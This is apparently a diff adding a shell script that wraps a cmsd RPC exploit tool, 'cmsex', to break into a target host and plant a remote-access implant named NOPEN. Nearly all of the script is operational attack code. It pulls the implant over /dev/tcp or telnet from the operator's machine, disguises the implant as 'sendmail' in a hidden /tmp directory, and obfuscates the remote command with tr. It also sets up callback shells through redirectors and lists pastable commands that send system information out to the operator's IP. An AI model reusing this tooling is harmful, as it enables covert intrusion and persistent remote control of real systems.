@@ -1,0 +1,725 @@
+#!/bin/sh
+# Defaults
+PROG=`basename ${0}`
+VER="2.1.0.3"
+ERRSLEEP=0
+AUTOMODE="$TARGETIP"
+[ "$TUNNELPORT" ] || TUNNELPORT=`cat /current/bin/.tunnelport 2>/dev/null`
+[ "$TUNNELPORT" ] || TUNNELPORT=18787
+COLOR_SUCCESS="\\033[1;32m"
+COLOR_FAILURE="\\033[1;31m"
+COLOR_WARNING="\\033[1;33m"
+COLOR_NORMAL="\\033[0;39m"
+COLOR_NOTE="\\033[0;34m"
+COLOR_WHITE="\\033[4;97m"
+SETCOLOR_SUCCESS="echo -en $COLOR_SUCCESS"
+SETCOLOR_FAILURE="echo -en $COLOR_FAILURE"
+SETCOLOR_WARNING="echo -en $COLOR_WARNING"
+SETCOLOR_NORMAL="echo -en $COLOR_NORMAL"
+SETCOLOR_NOTE="echo -en $COLOR_NOTE"
+SETCOLOR_WHITE="echo -en $COLOR_WHITE"
+# usagetext here so this can be used globally 
+DEFCALLBACKDELAY=15
+SYNTAX="[E=ratpreargs] [A=ratpostargs] $PROG [options]
+"
+CMSEXTYPES=`/current/bin/cmsex 2>/dev/null | grep -v "not implemented" | egrep "^[0-9]+:" | sed "s/^/              /g"`
+[ "$CMSEXTYPES" ] && CMSEXTYPES=" Valid -T values:\n$CMSEXTYPES"
+usagetextshort="
+Usage:  $SYNTAX
+$PROG uploads and runs NOPEN via ./cmsex and is compatible with
+NOPEN's builtin -sploit command.
+
+REQUIRED OPTIONS - Usual upload/execute mode
+
+-i IP     Target IP (or 127.0.0.1 if redirecting)
+-u|t #    Target's udp/tcp cmsd port (prog 100068); 0 queries portmapper.
+
+If only a udp port is registered by 100068 and the script fails against
+that port, tickling that port will 'wake up' a tcp port on the same service
+to try, as well. (i.e., with \"rpcinfo -u -n UDPPORT TARGET_IP 100068\")
+
+TROUBLESHOOT OPTION
+
+-R       Run specific commands on target, not the usual (you are
+         prompted for the command string to send). OTHER OPTIONS below
+         are ignored when using -R.
+
+OTHER OPTIONS - [default in brackets if any]
+
+-T #     Target code to send ./cmsex.$CMSEXTYPES
+-n #     Local tcp port for netcat upload [random]
+-l IP    Local IP for netcat upload [the first active IP in this order:
+                                     ppp0, ppp1, eth0 or eth1]
+-r name  Name to call uploaded file on target [sendmail]
+-D dir   Working directory to create/use on target [/tmp/.scsi]
+-p #     NOPEN port for either listen or callback mode [random]
+-c       Use NOPEN in callback mode to local IP (also see -S)
+-C IP    Use NOPEN in callback mode to this IP instead of local IP
+-s #     Change delay used for -c|C to # seconds [$DEFCALLBACKDELAY]
+-z       Do NOT use uncomrpess at the far end (so DO NOT compress here)
+-P       Assume PATH=. will fail so use ./ratname
+-M       Disable remote command munging via tr.
+-G       Retry exploit--using already uploaded RAT (useful when you need
+         to try adding -P option or try another RAT callback port).
+"
+usagetext="$usagetextshort
+In the usual upload/execute mode, unless the -T option is used, $PROG
+uses the remote system's tr program (see \"man tr\") to unmunge the
+string sent via cmsex into the commands we want him to execute. See dtail
+below. $PROG will build and show the munged and unmunged strings,
+prompting to abort or continue before any packets are sent.
+
+$PROG uses ./cmsex to send a sequence of commands to target that
+uploads and executes a RAT (NOPEN).
+
+NOTE: The environment variables E and A, if defined, will be put on command
+line before the rat (put environment vars here) and after the rat (put fake
+args here or other commands to execute), respectively. If you use \$E or \$A,
+they will not necessarily override those set/used by the rat server.
+
+     NOTE: they are not necessary for NOPEN ports/callbacks set with above
+           options. E.g., you could use A=\"; rm sendmail\" if you want.
+
+"
+note() {
+    unset N
+    if [ "$1" = "-n" ] ; then
+      N=$1
+      shift
+    fi
+    echo -e $N "$COLOR_NOTE${*}$COLOR_NORMAL"
+}
+notered() {
+    unset N
+    if [ "$1" = "-n" ] ; then
+      N=$1
+      shift
+    fi
+    echo -e $N "$COLOR_FAILURE${*}$COLOR_NORMAL"
+}
+tunnelcmd() {
+    echo "${*}"	| nc -w1 -u 127.0.0.1 $TUNNELPORT
+}
+usage() {
+
+    [ "$1" = "exit" ] && EXIT=1 && shift
+    if [ "$1" = "-h" ] ; then
+	shift
+	[ "$ERRSTR" ] || ERRSTR="\nNOTE: \a THE DEFAULT REQUIRES NO UU*CODE NOR ANY E=\"ratpreargs\"!!!!"
+	echo -e "$usagetext"
+	echo "Usage:  $SYNTAX"
+	echo "$PROG version $VER"
+    fi
+    if [ "$1" = "-v" ] ; then
+	echo "$PROG version $VER"
+	shift
+    fi
+    ERRSTR="${*}"
+    if [ "$ERRSTR" ] ; then
+	notered "\a${ERRSTR}"
+    fi
+    [ "$EXIT" ] && exit
+} # end usage
+
+doit() {
+    CMDLINE="\nCommandLine: ${0} ${*}"
+    CALLBACKDELAY=$DEFCALLBACKDELAY
+    # lab testing?
+    ifconfig 2>&1  | grep "555.1\.2\." > /dev/null && CALLBACKDELAY=4
+    unset NOPENPORT CALLBACKIP CALLBACK OLDCMD USE_TR NOZIP PACKARGS DOTSLASH CMDOVERRIDE SCRIPT
+    unset UNCOMPRESS REDIRECT UUARG FOUNDNOCLIENTLISTENER
+    RETRYONLY=0
+    USE_TR=yes
+    [ "${*}" ] || usage exit -h
+    while getopts p:cl:ths:zPvu:s:Ri:n:r:D:P:a:S:C:MT:G op; do
+	case $op in
+            h)  usage exit -h ;;
+            v)  usage exit -v ;;
+    i) REMOTE_IP="${OPTARG}"  ;;
+    n) LOCAL_PORT="$OPTARG" ;;
+    l) LOCAL_IP="$OPTARG";;
+    r) REMOTE_FNAME="$OPTARG" ;;
+    D) REMOTE_DIR="$OPTARG" ;;
+    p) NOPENPORT="$OPTARG";;
+    a) [ "$ARCH" ] || ARCH="$OPTARG";;
+    u)  CMSD_PORT="$OPTARG"
+	CMSD_PROTO="udp"
+	CMSD_ARG="-u $OPTARG" ;;
+    t)  CMSD_PORT="$OPTARG"
+	CMSD_PROTO="tcp"
+	CMSD_ARG="-t $OPTARG" ;;
+	    M)  USE_TR="";;
+	    E)  RAT_PREARGS=" $OPTARG";;
+	    A)  RAT_POSTARGS=" $OPTARG";;
+	    C)  CALLBACKIP="$OPTARG"
+	CALLBACK=" callback";;
+	    c)  CALLBACK=" callback";;
+	    s)  CALLBACKDELAY="$OPTARG";;
+	    z)  NOZIP=yes
+		PACKARGS=" -z" ;;
+	    P)  DOTSLASH="./";;
+	    R)  CMDOVERRIDE=yes ;;
+	    T)  CMSD_TARGETCODE="-T $OPTARG";;
+            S)  SCRIPT="$OPTARG" ;;
+    G)  RETRYONLY=1 ;;
+	esac
+    done
+    shift `expr $OPTIND - 1`
+    [ "$#" -eq 0 -a "$REMOTE_IP" ] || usage exit -h
+    # fixed defaults here (random ports and such elsewhere)
+    [ "$SCRIPT" ] || SCRIPT="...."
+    [ "$REMOTE_FNAME" ] || REMOTE_FNAME=sendmail
+    [ "$REMOTE_DIR" ] || REMOTE_DIR=/tmp/.scsi
+    if [ ! "$CMDOVERRIDE" ] ; then
+	if [ ! "$NOPENPORT" ] ; then
+	    if [ "$RANDOMNOPENPORT" ] ; then
+		# reuse same random if we have it from last loop
+		NOPENPORT=$RANDOMNOPENPORT
+	    else
+		NOPENPORT=`mkrandom -n 2>/dev/null`
+		TMPTEST=`ps -wef 2>/dev/null | grep "noclient -l" | grep -v grep | head -1 | awk '{print \$10}'`
+		if [ "$TMPTEST" -a "$CALLBACK" ] ; then
+		    notered "Seeing a \"noclient -l $TMPTEST\", so using $TMPTEST for NOPEN callback port"
+		    FOUNDNOCLIENTLISTENER=1
+		    NOPENPORT=$TMPTEST
+		fi
+		unset TMPTEST
+		RANDOMNOPENPORT=$NOPENPORT
+	    fi
+	fi
+	if [ ! "$NOPENPORT" ] ; then
+	    usage "mkrandom not in path--needed to generate random port for NOPEN\n(use -p # to force a particular port)"
+	    return
+	fi
+    fi
+
+
+    [ "$E" ] && RAT_PREARGS=" $RAT_PREARGS $E" && echo "RAT_PREARGS=\"$RAT_PREARGS\""
+    [ "$A" ] && RAT_POSTARGS=" $RAT_POSTARGS $A" && echo "RAT_POSTARGS=\"$RAT_POSTARGS\""
+    echo ""
+
+    # show what we were called with
+    echo -e "$CMDLINE"
+
+    # Check to make sure tcp LISTEN is there
+    PORTS=`netstat -an | grep tcp.*LIST | cut -f 2 -d ":" | sort -rn | awk '{print $1}' |egrep -v "6000"`
+    if [ "$NOPENPORT" ] ; then
+	TMP=" random"
+	[ "$FOUNDNOCLIENTLISTENER" ] && TMP=" ${COLOR_FAILURE}FOUND$COLOR_NOTE"
+	note "Using$TMP NOPEN$CALLBACK port $NOPENPORT"
+    fi
+    
+    note Local ports LISTENing: $PORTS
+    echo
+    which packrat >/dev/null 2>&1
+    NOPACKRAT=$?
+    
+    if [ ! "$CMDOVERRIDE" -a $RETRYONLY == 0 ] ; then
+	if [ "$AUTOMODE"  ] ; then
+	    # autoattack mode so yes we want packrat
+	    PACKRAT_SCRIPME=yes
+	else
+	    RANDOMORNOT=""
+	    if [ "$LOCAL_PORT" ] ; then
+		for i in $PORTS -1 ; do
+		    [ "$i" = "$LOCAL_PORT" ] && break
+		done
+		if [  $i -lt 0 ] ; then
+		    if [ -e $NOSERVER -a "$NOPACKRAT" = "0" ] ; then
+			PACKRAT_SCRIPME=yes
+		    else
+			[ "$NOPACKRAT" = "0" ] || notered "No packrat in your path"
+			notered "YOU MUST have a local LISTEN port on $LOCAL_PORT, and YOU DO NOT have /current/up/noserver\n\ato start one automatically"
+			sleep 3
+			notered "\a\nProceeding, assuming YOU WILL EITHER ABORT OR START LISTENER before continuing\npast next prompt."
+		    fi
+		else
+		    notered "\aLocalPort=$LOCAL_PORT provided on command line already LISTENing. Assuming that is the upload."
+		    sleep 2
+		fi
+	    else
+		unset ans MAKENEWPORT
+		if [ "$RANDOMLOCAL_PORT" ] ; then
+		    $LOCAL_PORT=$RANDOMLOCAL_PORT
+		else
+		    MAKENEWPORT=1
+		fi
+		while [ "$MAKENEWPORT" ] ; do
+		    LOCAL_PORT=`mkrandom -n 2>/dev/null`
+		    RANDOMORNOT=" a random"
+		    RANDOMLOCAL_PORT=$LOCAL_PORT
+		    [ ! "$LOCAL_PORT" ] && usage "mkrandom not in path--needed to generate random rat upload port"
+		    ALREADYTHERE=`netstat -an | grep tcp.*LIST | grep ":$LOCAL_PORT "`
+		    [ "$ALREADYTHERE" ] || break
+		done
+		while [ ! -e $NOSERVER ] ; do
+		    notered Put correct noserver into $NOSERVER and hit return or ^C to abort.
+		    read ans
+		    continue
+		done
+		if [ "$NOPACKRAT" = "0" ] ; then
+		    PACKRAT_SCRIPME=yes
+		else
+		    usage exit "No packrat in your path$COLOR_NORMAL"
+		fi
+	    fi
+	    note "Using$RANDOMORNOT port ($LOCAL_PORT) for local RAT upload listener (packrat)"
+	    unset RANDOMORNOT
+	fi  
+	for pid in `pidof nc` ; do
+	    UULISTEN=`ls -al /proc/$pid/fd | grep \.uu`
+	    if [ "$UULISTEN" -a ! "$OLDCMD" ] ; then
+		usage exit "NOT GOOD: Your netcat LISTEN seems to be sending a .uu file--DO NOT (see usage):
+	    # ls -al /proc/$pid/fd | grep \.uu\n$UULISTEN"
+	    fi
+	done
+    fi # if ! $CMDOVERRIDE -a ! "$RETRYONLY"
+    if [ ! "$LOCAL_IP" ] ; then
+	if [ ! "`which grepip 2>/dev/null`" ] ; then
+	    notered "\aMust have \"grepip\" in path or provide -l IP on command line"
+	    exit
+	fi
+	for INT in ppp0 ppp1 eth0 eth1 ; do 
+	    ADDR=`ifconfig $INT 2>/dev/null | grepip | egrep -v "255|127\.0" | head -1`
+	    [ "$ADDR" ] && LOCAL_IP=$ADDR
+	    [ "$LOCAL_IP" ] && break
+	done
+	while [ ! "$LOCAL_IP" ] ; do
+	    echo -en "What is your local/redirector IP address? "
+	    [ "$LOCAL_IP" ] && echo -en "[$LOCAL_IP] "
+	    read ans
+	    [ "$ans" -a "${ans:0:1}" != "y" -a "${ans:0:1}" != "Y" ] && \
+		LOCAL_IP=$ans
+	    LOCAL_IP=`echo $LOCAL_IP | grepip`
+	    [ "$LOCAL_IP" ] || echo -e "\n\n\a$ans is not a valid IP. Try again.\n\n"
+	done
+	INT=" ($INT)"
+	note "Using $LOCAL_IP$INT for -l local IP argument"
+    fi
+
+    # Check for required args
+    [ -z "$REMOTE_IP" ] && usage exit "Error: missing remote IP (-i)"
+    [ -z "$CMSD_ARG" ] && usage exit "Error: missing cmsdPort (-u/t). Use port 0 to query via rpc."
+# DBG: Temporarily take this out allow rpc/111 to figure it out
+    if [ ! "$CMDOVERRIDE" ] ; then
+	[ -z "$REMOTE_DIR" ] && usage exit "Error: missing remote directory (-D)"
+	[ "${REMOTE_DIR:0:1}" = "/" ] ||
+	    usage exit "\a\nREMOTEDIR ($REMOTE_DIR) must start with \"/\"."
+	[ -z "$REMOTE_FNAME" ] && usage exit "Error: missing remote filename (-r)"
+	[ -z "$LOCAL_IP" ] && usage exit "Error: missing local IP (-l)"
+	[ -z "$LOCAL_PORT" ] && usage exit "Error: missing local netcat port (-n)"
+    fi
+    if [ "${REMOTE_IP:0:3}" = "127" ] ; then
+	REDIRECT=yes
+	ifconfig -a | grep $LOCAL_IP > /dev/null && NOTGOOD=yes
+	if [ "$NOTGOOD" ] ; then
+	    notered "ARE YOU SURE? It looks like you are redirecting (due to remote being $REMOTE_IP),
+and yet you want the RAT callback to go to $LOCAL_IP, WHICH\a IS ONE OF YOUR LOCAL IPs???"
+	    sleep 1
+	    notered -n "\nHit ^C to abort or enter to continue DESPITE THIS PROBLEM!!\a"
+	    read blah
+	fi
+	DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`
+	[ ! "$ACTUALTARGET" ] && [ "$AUTOMODE" ] && ACTUALTARGET=$TARGETIP
+	until [ `echo $ACTUALTARGET | grepip 2>/dev/null` ] ; do
+	    [ "$ACTUALTARGET" ] && echo Bad IP $ACTUALTARGET
+	    echo -en "\nEnter Target IP after redirecting through $LOCAL_IP: "
+	    [ "$DEFTARGET" ] &&  echo -en "[$DEFTARGET] " 
+	    read ACTUALTARGET
+	    [ ! "$ACTUALTARGET" ] && [ "$DEFTARGET" ] && ACTUALTARGET=$DEFTARGET
+	done
+	note Redirecting via 127.0.0.1/$LOCAL_IP to $ACTUALTARGET
+	if [ "$AUTOMODE" ] ; then
+	    # Anything specific to automated usage here
+	    note In AUTO/-sploit mode
+	fi
+    fi
+
+    if [ "$PACKRAT_SCRIPME" ] ; then
+	[ "$OLDCMD" ] || UUARG="-u"
+	TMPOKPACKRAT=`netstat -an | egrep "^tcp.*(0.0.0.0|127.0.0.1):$LOCAL_PORT .*LISTEN"`
+	if [ "$TMPOKPACKRAT" ] ; then
+	    TMPPSOK=`ps -efwwwww | grep packrat.*$LOCAL_PORT`
+	    if [ "$TMPPSOK" ] ; then
+		note "Seems like packrat is already LISTENing on $LOCAL_PORT. Not starting another."
+	    else
+		notered "SOMETHING is listening on $LOCAL_PORT, but there is no \"packrat.*$LOCAL_PORT\" in ps listing\a"
+		sleep 2
+		notered "Proceeding anyway. Make sure you know what you are doing.\a"
+		sleep 2
+	    fi
+	    unset TMPPSOK
+	else
+	    EXPLOIT_SCRIPME="packrat$PACKARGS $UUARG $REMOTE_FNAME $NOSERVER $LOCAL_PORT"
+	    note "Starting local packrat LISTENer to send noserver via port $LOCAL_PORT"
+	    export EXPLOIT_SCRIPME
+	    echo EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"  scripme -t PACKRAT -F -X \"-bg slategrey -fg white -geometry 131x39-0+0\"
+	    EXPLOIT_SCRIPME="$EXPLOIT_SCRIPME" scripme -t PACKRAT -F -X "-bg slategrey -fg white -geometry 131x39-0+0"
+	fi
+	unset TMPOKPACKRAT
+    fi
+    if [ "$CALLBACK" -a ! "$CALLBACKIP" ] ; then 
+	CALLBACKIP="$LOCAL_IP"
+    else
+	if [ "$CALLBACK" -a ! "$LOCAL_IP" = "$CALLBACKIP" ] ; then
+	    note "-C argument given for callback--overriding -l local IP from command line: $LOCAL_IP"
+	fi
+    fi
+
+    if [ "$CALLBACK" ] ; then
+	RAT_PREARGS=" S=$CALLBACKDELAY D=-uc${CALLBACKIP}:${NOPENPORT}"
+	if [ "$REDIRECT" ] ; then
+	    if [ "$FOUNDNOCLIENTLISTENER" ] ; then
+		notered "\aYou SEEM TO already have a NOPEN listener on $NOPENPORT.
+CONFIRM THAT IT IS ON $CALLBACKIP!!\n\n"
+	    else
+		notered "\aYou must establish a NOPEN listener on $CALLBACKIP:$NOPENPORT\n\n"
+		PASTABLE=`grep -v "^#" /current/down/didthis 2>/dev/null | grep "noclient.*$CALLBACKIP"`
+		[ "$PASTABLE" ] && PASTABLE="\ncd /current/down\n${PASTABLE}"
+		ifconfig -a | grep $CALLBACKIP && ITSLOCAL=yes
+		if [ "$ITSLOCAL" ] ; then
+		    echo "remote nopen window on $CALLBACKIP AND local listener:"
+		    note "\ncd /current/down/\n${PASTABLE}\n/current/bin/noclient -l $NOPENPORT\n\n"
+		else
+		    echo "remote nopen window on $CALLBACKIP:"
+		    note "${PASTABLE}\n\n-nrtun $NOPENPORT\n\n"
+#		PASTABLE=`grep -v "^#" /current/down/didthis 2>/dev/null | grep "noclient.*$CALLBACKIP" | sed "s/noclient/noclient -c \"-nrtun $NOPENPORT\"/"`
+#		EXPLOIT_SCRIPME="${PASTABLE}" scripme -t NOCLIENT -F -X " -geometry 131x39"
+
+		fi
+	    fi
+	    notered -n "Hit ^C to abort or enter once NOPEN callback window is ready"
+	    read blah
+	else # not redirecting
+	    POSTRUN="noclient -l $NOPENPORT"
+	fi
+    else # not callback
+	RAT_PREARGS=" D=-ul${NOPENPORT}"
+	if [ "$REDIRECT" ] ; then
+	    POSTRUN2="-nstun $ACTUALTARGET ${NOPENPORT}"
+	else
+	    POSTRUN2="noclient ${REMOTE_IP}:${NOPENPORT}"
+	fi
+    fi
+
+    if [ ! "$CMDOVERRIDE" ] ; then
+	if [ ! "$NOZIP" ] ; then
+	    UNCOMPRESS="&& uncompress -f ${REMOTE_FNAME}.Z"
+	    [ "$OLDCMD" ] || UNCOMPRESS=".Z&&uncompress -f ${REMOTE_FNAME}.Z"
+	    
+	fi
+	# this one has more spaces...don't use unless other fails...
+    	CMD="mkdir -p ${REMOTE_DIR} && cd ${REMOTE_DIR} && /bin/ksh -c \"/bin/cat < /dev/tcp/${LOCAL_IP}/${LOCAL_PORT} > ${REMOTE_FNAME}${UNCOMPRESS} && chmod 755 ${REMOTE_FNAME} && PATH=.${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}\""
+
+	CMD="mkdir -p ${REMOTE_DIR}&&cd ${REMOTE_DIR}&&/bin/ksh -c \"/bin/cat < /dev/tcp/${LOCAL_IP}/${LOCAL_PORT} > ${REMOTE_FNAME}${UNCOMPRESS}&&chmod 755 ${REMOTE_FNAME}&&PATH=.${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}\""
+
+	if [ "$OLDCMD" ] ; then
+	    CMD="mkdir -p ${REMOTE_DIR}&&cd ${REMOTE_DIR}&&telnet ${LOCAL_IP} ${LOCAL_PORT}</dev/console|uudecode>/dev/null 2>&1 ${UNCOMPRESS}&&PATH=.${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}"
+	fi
+    else
+	CMD=""
+	$SETCOLOR_NOTE
+	[ ! "$REMOTE_DIR" = "/tmp" ] && TMP=" rm -rf ${REMOTE_DIR} ; ls -arlt /tmp ;"
+	[ ! "$TMP" ] && TMP=" rm -rf ${REMOTE_DIR}/$REMOTE_FNAME ;"
+	echo -e "You may want to start something like this locally (YOU do this netcat--it is not automatic),
+or you may see no evidence of what you want done:\n"
+	notered "LOCALLY:"
+	echo -e "  nc -l -p 443"
+	echo ""
+	notered "Some pastable examples for the REMOTE end (pick one, or mix and match--up to you):"
+	echo -e "  ksh -c \"( w ; uname -a ) > /dev/tcp/$LOCAL_IP/443\""
+	echo -e "  ( w ; uname -a ) | telnet $LOCAL_IP 443"
+	echo -e "  ksh -c \"($TMP ls -alrt ${REMOTE_DIR} ) > /dev/tcp/$LOCAL_IP/443\""
+	echo -e "  ($TMP ls -alrt ${REMOTE_DIR} ) | telnet $LOCAL_IP 443"
+	echo -e "  ($TMP ls -alrt ${REMOTE_DIR} ) | telnet $LOCAL_IP `mkrandom -n 2>/dev/null`"
+	echo ""
+	unset TMP
+	while [ ! "$CMD" ] ; do
+	    notered "Enter Commands to run on target (see above examples), separated by \";\".\n"
+	    read CMD
+	done
+	note "\nCommands being run: $CMD\n"
+    fi # if $CMDOVERRIDE
+
+# this is unused for now--old cmsex.tn way
+OLDOLDCMD="echo \"
+PATH=/usr/openwin/bin:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/gnu/bin:/usr/ucb:/usr/X11R6/bin
+export PATH
+mkdir -p ${DIR}
+cd ${DIR}
+(echo 'open ${LOCAL_IP} ${LOCAL_PORT}';/bin/cat)| /bin/telnet | /bin/cat| /usr/bin/uudecode  > /dev/null 2>&1
+uncompress -f ${RUN_FILE}.Z
+chmod 0700 ${DIR}/${RUN_FILE}
+PATH=${DIR} ${RUN_FILE}
+rm ${SCRIPT}
+\" > ${SCRIPT} 
+/bin/sh ${SCRIPT}
+"
+    if [ "$USE_TR" ] ; then
+	# tr sets
+	#SET1="'0-}'"
+	#SET2="'1-~'"
+	ALPHA="ABCDEFGHIJKLMNOPQRSTUVWXYZ./abcdefghijklmnopqrstuvwxyz0123456789 <&"
+	THERE=`which permute 2>/dev/null`
+	if [ ! "$THERE"  ] ; then
+	    if [ -x "../bin/permute" ] ; then
+		export PATH=../bin:$PATH
+	    else
+		usage exit "FATAL ERROR: No \"permute\" in path."
+	    fi
+	fi
+	SET1=`permute "$ALPHA"`
+	SET2=`permute "$SET1"`
+	MUNGED="`echo "${CMD}" | tr "${SET1}" "${SET2}"`"
+	UNMUNGED="`echo \"${MUNGED}\" | tr "${SET2}" "${SET1}"`"
+	echo "
+munging via:
+    tr \"$SET1\" \"$SET2\"
+and vice versa.
+    
+MUNGED=\"$MUNGED\"
+    
+UNMUNGED=\"$UNMUNGED\"
+"
+
+	if [ "$SET1" = "$SET2" ] ; then
+	    echo "SET1=\"$SET1\""
+	    usage exit "FATAL ERROR. SET1 is the same as SET2."
+	fi
+	if [ ! "$UNMUNGED" = "$CMD" ] ; then
+	    echo "$UNMUNGED" > /tmp/UNMUNGED.$$
+	    echo "$CMD" > /tmp/CMD.$$
+	    cmp /tmp/UNMUNGED.$$ /tmp/CMD.$$
+	    wc /tmp/UNMUNGED.$$ /tmp/CMD.$$
+	    usage "FATAL ERROR. UNMUNGE TEST FAILED"
+	else
+	    echo -e "PASSSED TEST: \$CMD eq \$UNMUNGED.\n"
+	fi
+
+	$SETCOLOR_NOTE
+	echo -e "Now running this locally:\n
+cmsex -i $REMOTE_IP $CMSD_ARG $CMSD_TARGETCODE \
+  -c \"echo '${MUNGED}'|tr '${SET2}' '${SET1}'|sh\"\n"
+    else
+	notered "\a\nNOT MUNGING--CMD going over in the clear.\n\n"
+	echo -e "About to run this locally:\n
+cmsex -i $REMOTE_IP $CMSD_ARG $CMSD_TARGETCODE \
+  -c \"$CMD\"\n"
+    fi
+
+    if [ "$POSTRUN" ] ; then
+	echo -e "AND THEN the following will start automatically:\n\n$POSTRUN$COLOR_NORMAL\n"
+    fi
+
+    notered -n "<A>bort or <C>ontinue? [C] "
+    read blah
+    if [ "${blah:0:1}" = 'a' -o "${blah:0:1}" = 'A' ] ; then
+	notered "ABORTING!"
+	exit
+    fi
+    if [ "$REDIRECT" ] ; then
+	note "Sending tunnel commands to 127.0.0.1:$TUNNELPORT"
+	if [ $ATTEMPT -eq 1 ] ; then
+# tunnelcmd c 1 2
+	  tunnelcmd u $CMSD_PORT $ACTUALTARGET
+	else
+	  tunnelcmd c 2
+	fi
+	tunnelcmd r $LOCAL_PORT
+	tunnelcmd s
+    fi
+#    while [ 1 ] ; do
+	# Now check what we can before continuing
+	echo ""
+	while [ 1 ] ; do
+	    if [ "$CALLBACK" ] ; then
+		if [ "$REDIRECT" ] ; then
+		    OKNRTUN=`netstat -an | grep "^tcp.*:$NOPENPORT " | egrep "ESTAB|LISTEN"`
+		else
+		    OKNRTUN=okeydokey
+		fi
+	    else
+		OKNRTUN=okeydokey
+	    fi
+	    [ "$REDIRECT" ] || OKCMSD_PORT=okeydokey
+	    [ "$REDIRECT" ] && OKCMSD_PORT=`netstat -an | egrep -i "^${CMSD_PROTO}.*0 (0.0.0.0|127.0.0.1):$CMSD_PORT "`
+	    OKPACKRAT=`netstat -an | egrep "^tcp.*(0.0.0.0|127.0.0.1):$LOCAL_PORT .*LISTEN"`
+	    [ "$CMDOVERRIDE" -o $RETRYONLY == 1 ] && OKPACKRAT=nevermind
+	    [ "$OKCMSD_PORT" ] || notered "No $CMSD_PROTO/$CMSD_PORT seen locally in netstat"
+	    if [ ! "$OKNRTUN" ] ; then
+		notered "No -nrtun or noclient -l for callback seen locally on port $NOPENPORT in netstat"
+		note "${PASTABLE}\n\n-nrtun $NOPENPORT\n\n"
+	    fi
+	    if [ ! "$OKPACKRAT" ] ; then
+		if [ "$OKCMSD_PORT" -a "$OKNRTUN" ] ; then
+		    notered "waiting for packrat to start on port $LOCAL_PORT"
+		else
+		    notered "No packrat seen locally on port $LOCAL_PORT in netstat"
+		fi
+	    fi
+	    [ "$OKCMSD_PORT" ] && [ "$OKNRTUN" ] && [ "$OKPACKRAT" ] && break
+	    
+	    [ "$OKCMSD_PORT" ] && [ "$OKNRTUN" ] && sleep 2 && continue
+	    unset OKCMSD_PORT OKNRTUN OKPACKRAT
+	    notered "\a\n\nCANNOT PROCEED"
+	    notered "\a\n\nFix this and either ^C or hit Enter to try again."
+	    read blah
+	done
+	if [ "$USE_TR" ] ; then
+	    note "\n\nrunning this locally (using tr remotely):\n\ncmsex -i $REMOTE_IP $CMSD_ARG $CMSD_TARGETCODE \
+		-c \"echo '${MUNGED}' | tr '${SET2}' '${SET1}'|sh\"\n\n"
+	    cmsex -i $REMOTE_IP $CMSD_ARG $CMSD_TARGETCODE \
+		-c "echo '${MUNGED}' | tr '${SET2}' '${SET1}'|sh"
+	else
+	    note "\n\nrunning this locally:\n\ncmsex -i $REMOTE_IP $CMSD_ARG $CMSD_TARGETCODE \
+		-c \"$CMD\"\n\n"
+	    cmsex -i $REMOTE_IP $CMSD_ARG $CMSD_TARGETCODE \
+		-c "$CMD"
+	fi
+
+#    done
+    if [ ! "$CMDOVERRIDE" ] ; then
+	if [ "$POSTRUN" ] ; then
+	    notered "\n\n\aNOTE: Callback will not occur for $CALLBACKDELAY seconds or more"
+	    notered "      and MAYBE NOT until upload completes AND you ^C the netcat upload.\n\n"
+	    notered "\nNow running nopen listener with: $POSTRUN\n"
+	    exec $POSTRUN
+	fi
+	if [ "$POSTRUN2" ] ; then
+	    note "\nOnce you see all is done, you may want to proceed with:\n\n$POSTRUN2\n\n"
+	    notered NOTE: Listener may not be active until you ^C the netcat upload.
+	fi
+    fi
+} # end doit procedure
+
+if [ "$ARCH" ] ; then
+    NOSERVER=`ls -1 /current/up/morerats/noserver*solaris-2.6 2>/dev/null | grep -i ${ARCH} | tail -1`
+fi
+[ "$NOSERVER" ] || NOSERVER=/current/up/noserver
+
+[ "${*}" ] || usage exit -h
+[ "${*}" = "-h" ] && usage exit -h
+[ "${*}" = "-v" ] && usage exit -v
+ATTEMPT=1
+while [ 1 ] ; do
+    # This is called by autoattack so allow changes
+    ALLOWCHANGE="$AUTOMODE$NEEDT"
+    [ $ATTEMPT -gt 1 ] && ALLOWCHANGE=yes
+    if [ "$ALLOWCHANGE" -a "$ARGS${*}" ] ; then
+	if [ "$ARGS" ] ; then
+	    notered "Last attempt used these arguments:\n$COLOR_NORMAL\n${ARGS}\n"
+	    OPTIND=1
+	else
+	    # show short usage here
+	    echo -e "$usagetextshort"
+	    notered "Automatic mode has pre-set these arguments:\n$COLOR_NORMAL\n${*}\n"
+	    ARGS="${*}"
+	fi
+
+	TMPTARGETIP="TARGETIP"
+	[ "$TARGETIP" ] && TMPTARGETIP=$TARGETIP
+	note "\n\nIf unsure of what target (-T#) to use, these -scans might be helpful:\n
+	    -scan snmp1 $TMPTARGETIP one
+	    -scan snmp2 $TMPTARGETIP one
+	    -scan telnet $TMPTARGETIP one\n"
+
+	notered "\n\nJust hit return to keep these arguments, or input a new and complete argument\nstring to use instead:\n"
+	read ans
+	if [ "$ans" ] ; then
+	    ARGS="$ans"
+	    note Changing arguments to: $ARGS
+	else
+	    note NOT changing arguments
+	fi
+	TMPTEST=`echo "$ARGS" | grep -- "-T"`
+	if [ ! "$TMPTEST" ] ; then
+	    if [ "$CMSEXTYPES" ] ; then
+		notered "$CMSEXTYPES\a"
+	    fi	    
+	    notered "\n\nYou must still provide the required \"-T #\" argument (see chart above from cmsex usage)."
+	    NEEDT=yes
+	    continue
+	else
+	    NEEDT=
+	fi
+    else
+	ARGS="${*}"
+	TMPTEST=`echo "$ARGS" | grep -- "-T"`
+	if [ ! "$TMPTEST" ] ; then
+	    if [ "$CMSEXTYPES" ] ; then
+		notered "$CMSEXTYPES\a"
+	    fi	    
+	    notered "\n\nYou must still provide the required \"-T #\" argument."
+	    NEEDT=yes
+	    continue
+	else
+	    NEEDT=
+	fi
+    fi
+    unset TMPTEST
+
+    doit $ARGS
+    note "\n\n$PROG attempt number $ATTEMPT is complete."
+    if [ ! "$CMDOVERRIDE" ] ; then
+	if [ "$CALLBACK" ] ; then
+	    notered "\nNOTE: Callback will not happen until $CALLBACKDELAY seconds or more have passed.\n"
+	    while [ $CALLBACKDELAY -ge 0 ] ; do
